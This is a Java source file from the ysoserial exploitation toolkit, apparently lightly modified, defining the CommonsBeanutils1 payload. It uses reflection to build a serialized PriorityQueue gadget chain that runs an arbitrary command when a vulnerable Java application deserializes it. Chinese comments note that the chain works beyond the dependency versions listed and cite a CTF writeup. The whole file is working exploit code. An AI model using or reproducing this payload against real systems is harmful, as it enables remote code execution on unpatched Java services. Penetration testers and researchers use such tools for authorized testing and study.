package ysoserial.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
// 这个版本号，
// 一些新手可能会被 ysoserial 里标注的利用链依赖库版本所迷惑，认为某个链就只能在对应标注的依赖版本下起作用，其实并非如此。
// 像 ysoserial 里 CommonsBeanutils1 这个链，实际上反映的只是 ysoserial 作者在编写利用时用到的库版本，实际的影响范围可能并不局限于此。
// 参考：[Real Wolrd CTF 3rd Writeup | Old System](https://mp.weixin.qq.com/s/ClASwg6SH0uij_-IX-GahQ)
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
//        final Object templates = Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);

		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1.class, args);
	}
}
